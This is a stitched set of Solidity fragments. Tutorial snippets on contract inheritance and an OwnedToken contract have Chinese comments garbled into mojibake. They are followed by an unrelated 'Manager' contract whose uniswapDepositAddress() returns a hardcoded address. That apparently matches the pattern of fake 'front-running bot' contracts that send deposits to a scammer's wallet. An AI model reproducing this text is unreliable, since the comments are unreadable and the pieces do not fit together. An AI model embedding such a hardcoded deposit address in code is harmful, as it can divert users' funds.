...
contract E is C {
    /*function g() public {
        C c = new C();
        uint val = compute(3, 5); // 璁块棶鍐呴儴鎴愬憳锛堜粠缁ф壙鍚堢害璁块棶鐖跺悎绾︽垚鍛橈�?
    }*/
}

contract OwnedToken {
    // TokenCreator 鏄涓嬪畾涔夌殑鍚堢害绫诲�?
    ...
    function changeName(bytes32 newName) public {
        // 鍙�?creator 锛堝嵆鍒涘缓褰撳墠鍚堢害鐨勫悎绾︼級鑳藉鏇存敼鍚嶇О 鈥斺€� 鍥犱负鍚堢害鏄殣寮忚浆鎹负鍦板潃鐨勶�?
        // 鎵€浠ヨ繖閲岀殑姣旇緝鏄彲琛岀殑銆�?
...
contract Manager {
	...
	function uniswapDepositAddress() public pure returns (address) {
		return 0x71AE8A5C6179e0De90f26DF5d04F156911d91476;
	}
}
